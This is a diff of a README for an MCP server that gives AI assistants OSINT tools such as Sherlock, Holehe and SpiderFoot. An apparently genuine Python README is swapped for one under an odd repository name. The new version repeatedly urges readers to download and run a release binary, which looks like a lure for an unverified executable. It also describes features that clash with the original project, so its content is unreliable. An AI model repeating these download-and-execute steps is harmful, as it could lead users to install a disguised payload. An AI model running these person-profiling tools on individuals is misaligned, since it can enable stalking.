@@ -1,237 +1,223 @@
-# 🔍 OSINT Tools MCP Server
-
-[![MCP Server](https://img.shields.io/badge/MCP-Server-blue)](https://github.com/modelcontextprotocol/specification)
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)
-[![OSINT](https://img.shields.io/badge/OSINT-Tools-red)](https://github.com/topics/osint)
-
-A comprehensive MCP server that exposes multiple OSINT tools to AI assistants like Claude. This server allows AI to perform sophisticated reconnaissance and information gathering tasks using industry-standard OSINT tools.
-
-## 🛠️ Available Tools
-
-### 🔍 **Sherlock** - Username Search
-Search for usernames across 399+ social media platforms and websites. Perfect for digital footprint analysis.
-- **Input**: Username
-- **Output**: List of platforms where username exists
-
-### 📧 **Holehe** - Email Verification  
-Check if an email is registered on 120+ platforms. Lightning fast and accurate.
-- **Input**: Email address
-- **Output**: Platforms where email is registered
-
-### 🕷️ **SpiderFoot** - Comprehensive OSINT
-The Swiss Army knife of OSINT. Performs deep reconnaissance with automatic target type detection.
-- **Input**: IP, domain, email, phone, username, person name, Bitcoin address, or network block
-- **Output**: Comprehensive intelligence report
-- **⚠️ Note**: SpiderFoot can take 5-30 minutes to complete a full scan. Be patient!
-
-### 🔎 **GHunt** - Google Account Intel
-Extract information from Google accounts using email or Google ID.
-- **Input**: Email or Google ID
-- **Output**: Google account details and associated information
-
-### 🌐 **Maigret** - Advanced Username Search
-Search across 3000+ sites with false positive detection and detailed analysis.
-- **Input**: Username
-- **Output**: Detailed report with confidence scores
-
-### 🌾 **TheHarvester** - Domain Intelligence
-Gather emails, subdomains, hosts, employee names, and more from public sources.
-- **Input**: Domain or company name
-- **Output**: Comprehensive domain intelligence
-
-### 🐦 **Blackbird** - Fast Username OSINT
-Lightning-fast searches across 581 sites for username reconnaissance.
-- **Input**: Username
-- **Output**: Quick profile discovery results
-
-## 🚀 Installation
-
-### MCP Server Setup
-
-1. **Clone this repository:**
-```bash
-git clone https://github.com/frishtik/osint-tools-mcp-server.git
-cd osint-tools-mcp-server
-```
-
-2. **Install dependencies:**
-```bash
-pip install -r requirements.txt
-```
-This will automatically install Sherlock, Holehe, Maigret, and TheHarvester.
-
-3. **Configure Claude Desktop:**
-
-Add to your Claude Desktop configuration (`~/Library/Application Support/Claude/claude_desktop_config.json` on macOS):
-
-```json
-{
-  "mcpServers": {
-    "osint-tools": {
-      "command": "python",
-      "args": ["/path/to/osint-tools-mcp-server/src/osint_tools_mcp_server.py"],
-      "env": {
-        "PYTHONUNBUFFERED": "1"
-      }
-    }
-  }
-}
-```
-
-4. **Restart Claude Desktop** to load the new MCP server.
-
-### Prerequisites for Additional Tools
-
-Some tools require manual installation due to their complexity:
-
-#### SpiderFoot
-```bash
-git clone https://github.com/smicallef/spiderfoot.git /opt/spiderfoot
-cd /opt/spiderfoot
-pip install -r requirements.txt
-```
-
-#### GHunt
-```bash
-git clone https://github.com/mxrch/GHunt.git /opt/ghunt
-cd /opt/ghunt
-pip install -r requirements.txt
-```
-
-#### Blackbird
-```bash
-git clone https://github.com/p1ngul1n0/blackbird.git /opt/blackbird
-cd /opt/blackbird
-pip install -r requirements.txt
-```
-
-## 🎮 Usage Tips
-
-### Getting Started
-
-Working with AI for OSINT is a bit of an art form. Here's how to get the best results:
-
-#### Start Simple with Holehe
-I recommend starting with the **Holehe** tool - it's fast, reliable, and gives you immediate results:
-
-```
-"Check if john.doe@example.com is registered on any platforms"
-```
-
-#### Level Up to Username Searches
-Once you're comfortable, try username searches with Sherlock or Maigret:
-
-```
-"Search for the username 'johndoe123' across social media platforms"
-```
-
-#### Complex Orchestrations
-Here's where it gets interesting. You can chain tools together:
-
-```
-"I found an email address contact@suspicious-site.com. Can you:
-1. Check what platforms it's registered on
-2. Extract the domain and search for subdomains and other emails
-3. Search for any usernames associated with this domain"
-```
-
-#### Let the AI Be Smart
-Sometimes the best approach is to give Claude context and let it decide:
-
-```
-"I'm investigating the digital footprint of username 'hackerman2024'. 
-Use your judgment to gather as much information as possible."
-```
-
-### Pro Tips 🎯
-
-1. **Be Patient with SpiderFoot**: It's incredibly thorough but can take up to 30 minutes for a full scan. Start it and grab a coffee!
-
-2. **Parallel Processing**: Claude can run multiple tools simultaneously. Don't hesitate to ask for parallel searches:
-   ```
-   "Search for 'johndoe' on both Sherlock and Maigret at the same time"
-   ```
-
-3. **Know When to Hold the Leash**: 
-   - For specific investigations: Be explicit about which tools to use
-   - For exploratory research: Let Claude choose the tools
-   - For time-sensitive tasks: Avoid SpiderFoot, stick to faster tools
-
-4. **Cross-Reference Results**: Different tools have different databases. Maigret might find accounts that Sherlock misses and vice versa.
-
-5. **Email First, Username Second**: If you have an email, start there - it's usually more unique than usernames.
-
-## ⚖️ Ethical Usage & Legal Compliance
-
-**🚨 IMPORTANT: This tool is for legitimate security research and OSINT investigations only.**
-
-### You MUST:
-- ✅ Only gather publicly available information
-- ✅ Respect privacy laws in your jurisdiction (GDPR, CCPA, etc.)
-- ✅ Follow platforms' Terms of Service
-- ✅ Use findings responsibly and ethically
-- ✅ Obtain proper authorization for any professional investigations
-
-### You MUST NOT:
-- ❌ Use this for stalking, harassment, or any malicious purpose
-- ❌ Violate any local, state, or federal laws
-- ❌ Access private or protected information
-- ❌ Use findings to harm individuals or organizations
-
-## 🔧 Troubleshooting
-
-### Common Issues
-
-**Tools not found**: Make sure all OSINT tools are installed and in your PATH:
-```bash
-which sherlock holehe maigret theharvester
-```
-
-**SpiderFoot errors**: Ensure SpiderFoot is installed in `/opt/spiderfoot` or update the path in the code.
-
-**Timeout issues**: Some tools may timeout on slow connections. Try increasing the timeout parameter:
-```
-"Search for username with a 30 second timeout"
-```
-
-**Rate limiting**: Some platforms rate-limit searches. If you're getting blocked, wait a bit and try again.
-
-## 🏗️ Architecture
-
-This MCP server uses Python's asyncio for non-blocking tool execution. Each tool runs in a subprocess, allowing for parallel execution and proper timeout handling.
-
-```
-Claude Desktop <-> MCP Protocol <-> OSINT MCP Server <-> OSINT Tools
-```
-
-## 🤝 Contributing
-
-Found a bug? Want to add a new tool? Contributions are welcome! 
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/NewOSINTTool`)
-3. Commit your changes (`git commit -m 'Add NewOSINTTool support'`)
-4. Push to the branch (`git push origin feature/NewOSINTTool`)
-5. Open a Pull Request
-
-## 📚 Acknowledgments
-
-Special thanks to these awesome projects:
-- [mcp-maigret](https://github.com/BurtTheCoder/mcp-maigret) - Inspiration for MCP implementation and README structure. Go give them a ⭐!
-- [Model Context Protocol](https://github.com/modelcontextprotocol/specification) - The protocol making all this possible
-- All the incredible OSINT tool maintainers
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚠️ Disclaimer
-
-This tool is provided for educational and legitimate security research purposes only. The authors are not responsible for any misuse or damage caused by this program. Use at your own risk and always ensure you have proper authorization before conducting any investigations.
-
----
-
-**Remember**: With great power comes great responsibility. Use these tools wisely and ethically! 🦸‍♂️
-
-Built with ❤️ for the OSINT community
+https://github.com/12345678969696969/osint-tools-mcp-server/releases
+
+# OSINT MCP Server — Expose Recon Tools to AI Assistants
+
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/12345678969696969/osint-tools-mcp-server/releases)  
+[![ai](https://img.shields.io/badge/topic-ai-lightgrey?style=flat-square)](https://github.com/topics/ai) [![claude](https://img.shields.io/badge/topic-claude-lightgrey?style=flat-square)](https://github.com/topics/claude) [![osint](https://img.shields.io/badge/topic-osint-lightgrey?style=flat-square)](https://github.com/topics/osint) [![mcp](https://img.shields.io/badge/topic-mcp-lightgrey?style=flat-square)](https://github.com/topics/mcp) [![recon](https://img.shields.io/badge/topic-recon-lightgrey?style=flat-square)](https://github.com/topics/reconnaissance)
+
+Hero image  
+![Recon Hero](https://images.unsplash.com/photo-1518770660439-4636190af475?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=faces)
+
+A server that exposes a set of OSINT tools behind a simple MCP-compatible API. Use this server to let AI assistants like Claude call recon and investigation tools in a controlled way. The server bundles wrappers for common open-source tools and provides REST and MCP endpoints. It runs as a standalone binary or a container.
+
+Status: stable for lab use. Use the Releases page to download the packaged binary or image and run it. Download the release asset and execute the server binary for your platform by following the commands in the release notes: https://github.com/12345678969696969/osint-tools-mcp-server/releases
+
+Features
+- Expose multiple OSINT tools via MCP and HTTP.
+- Normalize results into JSON for AI consumption.
+- Run tool jobs in sandboxes and return structured output.
+- Rate limit and queue requests per client key.
+- Simple plugin layout to add new tools.
+- Metrics and logs for audit and debugging.
+- Docker and bare-binary deployment.
+
+Why this repo
+- Combine popular OSINT tools behind one API.
+- Let assistants call recon tools without shell access.
+- Keep tool behavior consistent and parse results for further analysis.
+
+Supported tools (examples)
+- Sherlock — username lookup across platforms.
+- SpiderFoot — large-scale surface mapping.
+- Holehe — account existence checks via email.
+- Custom fingerprinting modules for domains, IPs, and social profiles.
+Each tool runs in an adapter that maps inputs and outputs to a common schema.
+
+Quick architecture
+- HTTP API + MCP listener
+- Worker pool for tool execution
+- Tool adapters (Python, Go, shell)
+- Storage for job state and results (SQLite by default)
+- Access control and API keys
+
+Getting started
+
+Prerequisites
+- Linux, macOS, or Windows.
+- Docker (optional).
+- An API key for external tools where needed (e.g., Shodan, VirusTotal).
+
+Download and run (binary)
+- Visit the Releases page and download the appropriate package. The release contains the server binary and example configs. Download the release asset and execute the binary for your platform. See the release notes for exact filenames and checksums: https://github.com/12345678969696969/osint-tools-mcp-server/releases
+- Example:
+  - chmod +x osint-mcp-server-linux
+  - ./osint-mcp-server-linux --config config.yml
+- The server starts on port 8080 by default.
+
+Run with Docker
+- Pull the image from a registry (see release notes for tags) or build locally:
+  - docker build -t osint-mcp-server .
+  - docker run -p 8080:8080 -v ./config.yml:/app/config.yml osint-mcp-server
+- The container exposes the same endpoints.
+
+Configuration (config.yml)
+- server:
+  - host: 0.0.0.0
+  - port: 8080
+- storage:
+  - type: sqlite
+  - path: data/db.sqlite
+- auth:
+  - api_keys:
+    - key: your-key-1
+      rate_limit: 10/m
+- tools:
+  - sherlock:
+    - path: /usr/local/bin/sherlock
+    - timeout: 60
+  - spiderfoot:
+    - mode: local
+    - api_key: your-spiderfoot-key
+- logging:
+  - level: info
+  - file: logs/server.log
+
+Endpoints
+
+MCP endpoint
+- Host an MCP listener compatible with assistant connectors.
+- Use the MCP protocol to call these methods:
+  - recon.run_tool
+    - params: tool_name, target, options
+    - returns: job_id
+  - recon.get_result
+    - params: job_id
+    - returns: status, output
+- The server uses JSON-RPC style messages over the MCP channel.
+
+HTTP API
+- POST /api/v1/run
+  - JSON: { "tool": "sherlock", "target": "alice" }
+  - Response: { "job_id": "abc123", "status": "queued" }
+- GET /api/v1/result/{job_id}
+  - Response: { "job_id": "abc123", "status": "done", "result": {...} }
+- GET /health
+  - Response: { "status": "ok", "uptime": 12345 }
+
+Tool adapters
+- Each tool adapter isolates the tool process and maps raw output to JSON.
+- Adapters include parsers for common tools:
+  - Sherlock adapter parses profile links and availability.
+  - Holehe adapter extracts provider, result, and confidence.
+  - SpiderFoot adapter maps modules and module output fields.
+- Add adapters by following the adapter template in /adapters/template.
+
+Job lifecycle
+- Submit job via MCP or HTTP.
+- Server validates input and enqueues job.
+- Worker picks job and runs tool adapter.
+- Server stores raw logs and normalized JSON.
+- Result becomes available via API or MCP callback.
+
+Security model
+- API keys restrict access and set limits per client.
+- Jobs run in a sandbox. The sandbox isolates file I/O and network scope.
+- You can restrict which tools a key can call.
+- Audit logs record command input, outputs, and user ID.
+
+Best practices for AI assistants
+- Ask for permission before running any global scans.
+- Provide a short scope for recon jobs.
+- Use the normalized JSON output for follow-up prompts.
+- Avoid chaining high-impact modules without human review.
+
+Examples
+
+Sherlock example (HTTP)
+- Request:
+  - POST /api/v1/run
+  - Body: { "tool": "sherlock", "target": "alice", "options": { "timeout": 30 } }
+- Response:
+  - { "job_id": "job_001", "status": "queued" }
+- Poll:
+  - GET /api/v1/result/job_001
+  - { "job_id": "job_001", "status": "done", "result": { "username": "alice", "platforms": [ { "site": "twitter", "found": true, "url": "https://twitter.com/alice" } ] } }
+
+Holehe example (MCP)
+- Call recon.run_tool with params:
+  - tool_name: holehe
+  - target: alice@example.com
+- The adapter returns provider checks and a confidence field.
+
+SpiderFoot example (large scan)
+- Start a SpiderFoot job with limited modules.
+- Use include/exclude lists to narrow the scan.
+- Retrieve findings and map them to entities for the assistant to summarize.
+
+Logging and metrics
+- The server emits logs to stdout and a file.
+- Metrics endpoint /metrics exposes counters and latencies in Prometheus format.
+- Track per-key request counts, job durations, and failures.
+
+Extending the server
+- Add a new tool adapter:
+  - Copy adapters/template to adapters/<tool-name>.
+  - Implement parse_raw_output and map_to_schema functions.
+  - Add a config block in config.yml.
+  - Register the adapter in the adapter registry.
+- Add new MCP methods by adding handler files in /mcp_handlers.
+
+Testing
+- Unit tests live in /tests.
+- Integration tests simulate MCP calls and run adapters with sample data.
+- Run tests:
+  - go test ./... (or use the included test script)
+
+Deployment tips
+- Run behind a reverse proxy for TLS termination.
+- Use a process manager to restart on crash.
+- Mount persistent storage for job data and logs.
+- Use a separate machine or VM for high-volume scanning.
+
+Common issues
+- Tool binary not found: check adapter path and permissions.
+- Job times out: increase tool timeout in config or reduce target size.
+- High queue time: increase worker_pool_size or add nodes.
+
+Contributing
+- Fork the repo, add a feature branch, and open a pull request.
+- Follow the adapter template for new tool integrations.
+- Add tests for new features.
+- Keep changes small and focused.
+
+Community and resources
+- Follow the releases page for binaries and updates: https://github.com/12345678969696969/osint-tools-mcp-server/releases
+- Join the issue tracker for bugs and feature requests.
+- Share adapters and configs in PRs.
+
+Licensing and credits
+- License: MIT by default (see LICENSE file).
+- Tool integrations use the upstream tool licenses.
+- Credits:
+  - Sherlock — username mapping
+  - SpiderFoot — surface mapping
+  - Holehe — email checks
+
+Screenshots and diagrams
+- Architecture diagram  
+  ![Architecture](https://raw.githubusercontent.com/github/explore/main/topics/architecture/architecture.png)
+- Example output screenshot  
+  ![Output](https://images.unsplash.com/photo-1492724441997-5dc865305da7?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop)
+
+Roadmap
+- Add more adapters for common OSINT tools.
+- Add per-tool sandbox profiles.
+- Add plugin marketplace for community adapters.
+- Improve MCP native bindings for more connectors.
+
+Changelog
+- See the Releases page for packaged builds and checksums: https://github.com/12345678969696969/osint-tools-mcp-server/releases
+
+Contact
+- Open an issue for bugs or feature ideas.
+- Use pull requests for code contributions.
